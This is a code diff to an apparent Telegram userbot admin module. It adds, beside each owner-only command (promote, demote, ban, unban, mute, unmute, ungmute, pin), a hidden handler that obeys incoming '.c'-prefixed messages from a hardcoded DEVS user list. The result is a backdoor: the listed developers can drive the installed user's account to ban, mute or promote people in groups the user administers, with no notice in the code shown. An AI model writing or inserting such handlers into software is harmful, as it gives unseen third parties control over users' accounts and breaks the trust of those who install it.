@@ -30,7 +30,12 @@ from telethon.tl.types import (
     PeerChat,
 )
 
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
+from userbot import (
+    BOTLOG,
+    BOTLOG_CHATID,
+    CMD_HELP,
+    DEVS,
+)
 from userbot.events import register
 
 # =================== CONSTANT ===================
@@ -114,6 +119,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -164,6 +170,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
@@ -213,6 +220,7 @@ async def demote(dmod):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?: |$)(.*)")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -266,6 +274,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?: |$)(.*)")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -302,6 +311,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -356,6 +366,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -434,6 +445,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -604,6 +616,7 @@ async def get_admin(show):
 
 
 @register(outgoing=True, pattern=r"^\.pin(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpin(?: |$)(.*)")
 async def pin(msg):
     # Admin or creator check
     chat = await msg.get_chat()
